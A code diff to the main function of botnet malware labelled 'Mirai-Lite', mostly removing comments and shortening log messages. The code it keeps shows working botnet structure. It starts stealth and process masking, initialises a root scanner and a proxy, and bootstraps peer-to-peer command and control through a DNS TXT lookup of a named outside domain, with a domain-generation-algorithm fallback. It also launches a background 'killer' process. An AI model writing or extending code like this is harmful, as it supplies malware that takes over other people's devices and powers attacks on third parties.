@@ -26,21 +26,15 @@ void handle_signal(int sig) {
 }
 
 int main(int argc, char *argv[]) {
-    // 0. Stealth & Persistence (FIRST THING)
-    // Removed process masking if debug mode
     if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
         printf("[Mirai-Lite] DEBUG MODE (Stealth Disabled)\n");
     } else {
         stealth_init(argc, argv);
     }
     
-    // 1. Signal Handling
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
-    
-    // (Daemonize logic skipped for brevity)
 
-    // 2. Init Components
     if (!scanner_init()) {
         fprintf(stderr, "[-] Failed to init Scanner (Running as root?)\n");
     } else {
@@ -50,7 +44,7 @@ int main(int argc, char *argv[]) {
     int proxy_sock = proxy_init();
     if (proxy_sock < 0) {
         fprintf(stderr, "[-] Failed to init Proxy\n");
-        return 1; // Proxy is critical
+        return 1;
     }
     printf("[+] Proxy listening on port %d\n", PROXY_LISTEN_PORT);
 
@@ -59,38 +53,30 @@ int main(int argc, char *argv[]) {
     int p2p_sock = p2p_init();
     if (p2p_sock < 0) {
         fprintf(stderr, "[-] Failed to init P2P\n");
-        // Proceed anyway, maybe isolated node
     } else {
         printf("[+] P2P listening on port %d\n", P2P_PORT);
         
-        // 1. Hardcoded Seed
         p2p_add_neighbor(inet_addr("127.0.0.1"), htons(P2P_PORT));
         
-        // 2. Smart Hybrid Bootstrap (Priority: Home > DGA)
-        
-        // Tier 1: Home Domain
-        printf("[*] Tier 1: Bootstrapping via dht.polydevs.uk...\n");
+        printf("[*] Bootstrapping via dht.polydevs.uk...\n");
         if (dns_resolve_txt("dht.polydevs.uk") == 0) {
-            printf("[+] Tier 1 Success: Connected via Home Domain.\n");
+            printf("[+] Connected via Home Domain.\n");
         } else {
-            // Tier 2: DGA
-            printf("[-] Tier 1 Failed. Switching to Tier 2 (DGA)...\n");
+            printf("[-] Home failed. Trying DGA...\n");
             char *dga_domain = dga_get_domain();
             printf("[*] Target DGA Domain: %s\n", dga_domain);
             
             if (dns_resolve_txt(dga_domain) == 0) {
-                printf("[+] Tier 2 Success: Connected via DGA.\n");
+                printf("[+] Connected via DGA.\n");
             } else {
-                printf("[-] Tier 2 Failed. Waiting for next cycle or retry.\n");
+                printf("[-] DGA failed. Waiting for next cycle.\n");
             }
         }
     }
 
-    // 2b. Start Killer (Background)
     killer_init();
     printf("[+] Killer Process Started (Background)\n");
 
-    // 3. Main Loop
     printf("[+] Entering Main Loop...\n");
     
     time_t last_gossip = time(NULL);
